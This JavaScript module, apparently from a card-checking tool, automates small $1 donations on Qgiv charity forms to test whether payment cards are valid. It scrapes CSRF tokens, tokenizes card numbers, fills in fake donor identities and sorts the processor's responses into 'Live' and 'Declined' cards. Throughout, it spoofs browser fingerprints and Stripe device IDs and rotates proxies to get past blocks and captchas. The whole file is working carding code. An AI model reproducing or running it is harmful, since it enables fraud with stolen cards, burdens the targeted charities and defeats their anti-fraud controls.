import got from 'got';
import { CookieJar } from 'tough-cookie';
import { fakeDataService } from '../../utils/FakeDataService.js';
import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';

/**
 * Qgiv Client
 * Platform: Qgiv donation platform
 * 
 * Flow: Load Form → Tokenize Card → Submit Donation
 * 
 * Standard Status Codes:
 * - Approved = Card charged successfully
 * - Live = Card confirmed valid (AVS fail, insufficient funds, 3DS)
 * - Declined = Card dead/invalid or generic decline
 * - Errors = Network/proxy errors
 */
export class QgivClient {
    constructor(siteConfig, options = {}) {
        if (!siteConfig) {
            throw new Error('QgivClient requires siteConfig');
        }
        
        this.site = siteConfig;
        this.proxyManager = options.proxyManager || null;
        this.timeout = options.timeout || 30000;
        this.maxRetries = options.maxRetries || 3;
        this.debug = options.debug || false;
    }

    // =========================================================================
    // LOGGING
    // =========================================================================
    _log(step, message, data = null) {
        if (!this.debug) return;
        const ts = new Date().toISOString().slice(11, 23);
        const prefix = `[${ts}] [${this.site.id}] ${step}:`;
        if (data) {
            console.log(`${prefix} ${message}`, JSON.stringify(data));
        } else {
            console.log(`${prefix} ${message}`);
        }
    }

    // =========================================================================
    // PROXY MANAGEMENT - Uses project's proxyAgentFactory with force rotation
    // =========================================================================
    
    /**
     * Get proxy agent from gateway proxyManager
     * @param {boolean} forceNew - Force get new proxy (for rotation after block/captcha)
     */
    async getProxyAgent(forceNew = false) {
        // If force rotation or no current agent, get new proxy
        if (forceNew || !this._currentProxyAgent) {
            if (this.proxyManager && typeof this.proxyManager.isEnabled === 'function' && this.proxyManager.isEnabled()) {
                const proxy = await this.proxyManager.getNextProxy();
                if (proxy) {
                    this._log('PROXY', `${forceNew ? 'Rotated to' : 'Using'} ${proxy.host}:${proxy.port}`);
                    this._currentProxyAgent = proxyAgentFactory.create(proxy);
                    return this._currentProxyAgent;
                }
            }
            this._currentProxyAgent = null;
            return null;
        }
        
        // Reuse existing proxy agent (same IP for same validation flow)
        return this._currentProxyAgent;
    }

    /**
     * Force rotation to new IP on next request
     * Call this when blocked/captcha detected
     */
    forceRotateProxy() {
        this._currentProxyAgent = null;
        this._log('PROXY', 'Force rotation requested');
    }

    // =========================================================================
    // RESPONSE CLASSIFICATION
    // =========================================================================
    static LIVE_PATTERNS = [
        { pattern: 'insufficient funds', code: 'insufficient_funds' },
        { pattern: 'insufficient_funds', code: 'insufficient_funds' },
        { pattern: 'insufficient balance', code: 'insufficient_funds' },
        { pattern: '3d secure', code: '3ds_required' },
        { pattern: 'authentication required', code: '3ds_required' },
        { pattern: 'authentication_required', code: '3ds_required' },
        { pattern: 'card_velocity_exceeded', code: 'velocity_exceeded' },
        { pattern: 'incorrect_cvc', code: 'incorrect_cvc' },
        { pattern: 'security code', code: 'incorrect_cvc' },
    ];

    static DEAD_PATTERNS = [
        { pattern: 'address verification failed', code: 'avs_failed' },
        { pattern: 'card_declined', code: 'card_declined' },
        { pattern: 'generic_decline', code: 'generic_decline' },
        { pattern: 'do_not_honor', code: 'do_not_honor' },
        { pattern: 'lost_card', code: 'lost_card' },
        { pattern: 'stolen_card', code: 'stolen_card' },
        { pattern: 'expired_card', code: 'expired_card' },
        { pattern: 'invalid_number', code: 'invalid_number' },
        { pattern: 'invalid_expiry', code: 'invalid_expiry' },
        { pattern: 'invalid_cvc', code: 'invalid_cvc' },
        { pattern: 'fraudulent', code: 'fraudulent' },
        { pattern: 'pickup_card', code: 'pickup_card' },
        { pattern: 'restricted_card', code: 'restricted_card' },
    ];

    _classifyResponse(errorMsg) {
        if (!errorMsg) return { status: 'Declined', code: 'card_declined', originalMessage: null };

        const lower = errorMsg.toLowerCase();

        for (const item of QgivClient.LIVE_PATTERNS) {
            if (lower.includes(item.pattern)) {
                return { status: 'Live', code: item.code, originalMessage: errorMsg };
            }
        }

        for (const item of QgivClient.DEAD_PATTERNS) {
            if (lower.includes(item.pattern)) {
                return { status: 'Declined', code: item.code, originalMessage: errorMsg };
            }
        }

        return { status: 'Declined', code: 'generic_decline', originalMessage: errorMsg };
    }

    _extractTransactionId(msg) {
        const match = msg?.match(/Transaction ID[:\s]*(\d+)/i);
        return match ? match[1] : null;
    }

    // =========================================================================
    // BROWSER CONTEXT - Uses project's fingerprintGenerator
    // =========================================================================
    generateBrowserContext() {
        const fingerprint = fingerprintGenerator.generateFingerprint({ mobile: false });
        const chromeMatch = fingerprint.userAgent.match(/Chrome\/(\d+)/);
        const chromeVersion = chromeMatch ? chromeMatch[1] : '131';

        return {
            guid: fingerprint.stripeIds.guid,
            muid: fingerprint.stripeIds.muid,
            sid: fingerprint.stripeIds.sid,
            userAgent: fingerprint.userAgent,
            sessionStart: Date.now(),
            secChUa: `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not-A.Brand";v="99"`,
            secChUaPlatform: fingerprint.userAgent.includes('Windows') ? '"Windows"'
                : fingerprint.userAgent.includes('Macintosh') ? '"macOS"' : '"Linux"',
            secChUaMobile: fingerprint.userAgent.includes('Mobile') ? '?1' : '?0',
            acceptLanguage: fingerprint.language.acceptLanguage,
        };
    }

    generateFakeUser() {
        const user = fakeDataService.generateFakeUser();
        const address = fakeDataService.generateAddress();
        return {
            ...user,
            address: address.line1,
            city: address.city,
            state: address.state,
            postalCode: address.postalCode,
            country: address.country,
        };
    }

    // =========================================================================
    // SESSION - Uses got with cookie jar
    // =========================================================================
    createSession(proxyAgent = null, browserContext = null) {
        const cookieJar = new CookieJar();

        return got.extend({
            timeout: { request: this.timeout },
            headers: {
                'User-Agent': browserContext?.userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': browserContext?.acceptLanguage,
                'Accept-Encoding': 'gzip, deflate, br',
                ...(browserContext && {
                    'Sec-CH-UA': browserContext.secChUa,
                    'Sec-CH-UA-Mobile': browserContext.secChUaMobile,
                    'Sec-CH-UA-Platform': browserContext.secChUaPlatform,
                }),
            },
            followRedirect: true,
            maxRedirects: 5,
            cookieJar,
            throwHttpErrors: false,
            http2: false,
            ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
        });
    }

    // =========================================================================
    // API METHODS
    // =========================================================================
    async loadFormPage(session) {
        const startTime = Date.now();
        try {
            const response = await session(this.site.formUrl, {
                headers: { 'Referer': this.site.baseUrl }
            });

            this._log('FORM', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
            }
            if (response.statusCode !== 200) {
                return { success: false, error: `HTTP_${response.statusCode}` };
            }

            const csrfMatch = response.body.match(/name=["']csrfToken["'][^>]*value=["']([^"']+)["']/i)
                || response.body.match(/value=["']([^"']+)["'][^>]*name=["']csrfToken["']/i);

            if (!csrfMatch) {
                return { success: false, error: 'NO_CSRF_TOKEN' };
            }

            return { success: true, csrfToken: csrfMatch[1] };
        } catch (error) {
            this._log('FORM', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
            return { success: false, error: error.code || error.message, isNetworkError: true };
        }
    }

    async tokenizeCard(session, cardData, csrfToken) {
        const startTime = Date.now();
        const url = `${this.site.tokenizeUrl}?csrfToken=${csrfToken}`;
        const expMonth = String(cardData.expMonth).padStart(2, '0');
        const expYear = String(cardData.expYear).length === 2 ? `20${cardData.expYear}` : String(cardData.expYear);

        const formData = new URLSearchParams({
            'Billing_Name': '',
            'Card_CVV': cardData.cvc || cardData.cvv,
            'Card_Exp_Date': `${expMonth}/${expYear}`,
            'Card_Number': cardData.number
        });

        try {
            const response = await session.post(url, {
                body: formData.toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json',
                    'Origin': this.site.baseUrl,
                    'Referer': this.site.formUrl,
                }
            });

            this._log('TOKEN', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
            }

            let data;
            try {
                data = JSON.parse(response.body);
            } catch {
                return { success: false, error: 'INVALID_JSON', isNetworkError: true };
            }

            if (data.success && data.token) {
                return { success: true, token: data.token };
            }

            return { success: false, error: data.message || 'TOKEN_FAILED' };
        } catch (error) {
            this._log('TOKEN', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
            return { success: false, error: error.code || error.message, isNetworkError: true };
        }
    }

    async submitDonation(session, params) {
        const startTime = Date.now();
        const { csrfToken, token, fakeUser, billingZip } = params;
        const url = `${this.site.submitUrl}?csrfToken=${csrfToken}`;
        const zipCode = billingZip || fakeUser.postalCode;

        const formData = new URLSearchParams({
            'form': this.site.formId,
            'productType': '1',
            'submissionType': '1',
            'Is_Multi_Restriction': 'false',
            'Express_Checkout': 'false',
            'Donations[0][Selected_One_Time_Id]': '1673646',
            'Donations[0][Other_One_Time_Amount]': '1',
            'Donations[0][Recurring_Frequency]': 'n',
            'Personal[First_Name]': fakeUser.firstName,
            'Personal[Last_Name]': fakeUser.lastName,
            'Personal[Email]': fakeUser.email,
            'Personal[Address]': '',
            'Personal[Address_2]': '',
            'Personal[City]': '',
            'Personal[State]': '',
            'Personal[Zip]': zipCode,
            'Personal[Country]': fakeUser.country,
            'Payment[Payment_Type]': '1',
            'Payment[Card_Token]': token,
            'Billing[Billing_Address]': '',
            'Billing[Billing_Address_2]': '',
            'Billing[Billing_City]': '',
            'Billing[Billing_State]': '',
            'Billing[Billing_Zip]': zipCode,
            'Billing[Billing_Country]': fakeUser.country,
            'Billing[Billing_Address_Use_Mailing]': 'false',
            'Privacy[Anonymity]': 'false',
            'AbandonedGift[qgiv_abandoned_gift]': `abandonedGiftDetails_${this._generateHash()}`,
            'AbandonedGift[source]': '0',
            'onePayValidationNonce': ''
        });

        try {
            const response = await session.post(url, {
                body: formData.toString(),
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Accept': 'application/json',
                    'Origin': this.site.baseUrl,
                    'Referer': this.site.formUrl,
                    'X-Requested-With': 'XMLHttpRequest',
                }
            });

            this._log('SUBMIT', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });

            if (response.statusCode === 403) {
                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
            }

            let data;
            try {
                data = JSON.parse(response.body);
            } catch {
                return { success: false, error: 'INVALID_JSON', isNetworkError: true };
            }

            const isSuccess = data.success === true || (data.success && data.success.transaction);

            if (isSuccess) {
                const txId = data.donation_id || data.success?.transaction?.id;
                if (data.requires_action) {
                    return { status: 'Live', code: '3ds_required', transactionId: txId };
                }
                return { status: 'Approved', transactionId: txId };
            }

            if (data.errors && data.errors.length > 0) {
                const errorMsg = data.errors[0];
                const classification = this._classifyResponse(errorMsg);
                const txId = this._extractTransactionId(errorMsg);
                return {
                    status: classification.status,
                    code: classification.code,
                    message: errorMsg,
                    transactionId: txId
                };
            }

            return { status: 'Declined', code: 'card_declined', message: 'Card declined' };
        } catch (error) {
            this._log('SUBMIT', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
            return { success: false, error: error.code || error.message, isNetworkError: true };
        }
    }

    // =========================================================================
    // MAIN VALIDATION
    // =========================================================================
    async validate(cardData) {
        const cardPreview = `${cardData.number.slice(0, 6)}****${cardData.number.slice(-4)}`;
        const startTime = Date.now();

        for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
            // First attempt: get new proxy, subsequent: reuse unless blocked
            const proxyAgent = await this.getProxyAgent(attempt === 1);
            const browserContext = this.generateBrowserContext();
            const session = this.createSession(proxyAgent, browserContext);
            const fakeUser = this.generateFakeUser();

            this._log('VALIDATE', `Attempt ${attempt}/${this.maxRetries} | ${cardPreview}`);

            // Step 1: Load form
            const formResult = await this.loadFormPage(session);
            if (!formResult.success) {
                if (formResult.isBlocked && attempt < this.maxRetries) {
                    this._log('VALIDATE', 'Blocked at form, rotating proxy...');
                    this.forceRotateProxy();
                    continue;
                }
                if (formResult.isNetworkError && attempt < this.maxRetries) {
                    this.forceRotateProxy();
                    continue;
                }
                return { 
                    status: 'Errors', 
                    message: formResult.error, 
                    card: cardPreview,
                    duration: Date.now() - startTime
                };
            }

            // Step 2: Tokenize
            const tokenResult = await this.tokenizeCard(session, cardData, formResult.csrfToken);
            if (!tokenResult.success) {
                if (tokenResult.isBlocked && attempt < this.maxRetries) {
                    this._log('VALIDATE', 'Blocked at tokenize, rotating proxy...');
                    this.forceRotateProxy();
                    continue;
                }
                if (tokenResult.isNetworkError && attempt < this.maxRetries) {
                    this.forceRotateProxy();
                    continue;
                }
                
                const classification = this._classifyResponse(tokenResult.error);
                return {
                    status: classification.status,
                    code: classification.code,
                    message: tokenResult.error,
                    card: cardPreview,
                    duration: Date.now() - startTime
                };
            }

            // Step 3: Submit
            const submitResult = await this.submitDonation(session, {
                csrfToken: formResult.csrfToken,
                token: tokenResult.token,
                fakeUser,
                billingZip: cardData.zip || cardData.billingZip
            });

            if (submitResult.success === false) {
                if (submitResult.isBlocked && attempt < this.maxRetries) {
                    this._log('VALIDATE', 'Blocked at submit, rotating proxy...');
                    this.forceRotateProxy();
                    continue;
                }
                if (submitResult.isNetworkError && attempt < this.maxRetries) {
                    this.forceRotateProxy();
                    continue;
                }
                return { 
                    status: 'Errors', 
                    message: submitResult.error, 
                    card: cardPreview,
                    duration: Date.now() - startTime
                };
            }

            this._log('VALIDATE', `Result: ${submitResult.status}`, { code: submitResult.code });

            return {
                status: submitResult.status,
                code: submitResult.code,
                message: submitResult.message,
                transactionId: submitResult.transactionId,
                card: cardPreview,
                attempts: attempt,
                duration: Date.now() - startTime
            };
        }

        return { 
            status: 'Errors', 
            message: 'MAX_RETRIES_EXCEEDED', 
            card: cardPreview,
            duration: Date.now() - startTime
        };
    }

    _generateHash() {
        return [...Array(40)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');
    }
}

export default QgivClient;
